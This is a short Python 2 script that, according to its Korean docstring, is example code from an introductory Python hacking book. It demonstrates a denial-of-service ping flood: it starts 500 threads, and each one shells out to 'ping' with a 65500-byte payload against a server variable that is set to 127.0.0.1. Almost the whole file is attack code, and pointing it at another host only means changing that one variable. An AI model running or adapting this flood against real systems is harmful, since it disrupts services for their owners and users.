#!/usr/bin/env python
#-*- coding: utf-8 -*-
'''
    python ==> 파이썬해킹입문, ping 127.0.0.1 -l 65500 을 500개의 스레드를 사용해 DOS 공격을 해보는 예제 코드
'''
import subprocess
import thread
import time

server = '127.0.0.1'

def POD(id):
	ret = subprocess.call("ping " + server + " -l 65500", shell=True)
	print "%d, " % id

for i in range(500):
	thread.start_new_thread(POD,(i,))

time.sleep(0.8)























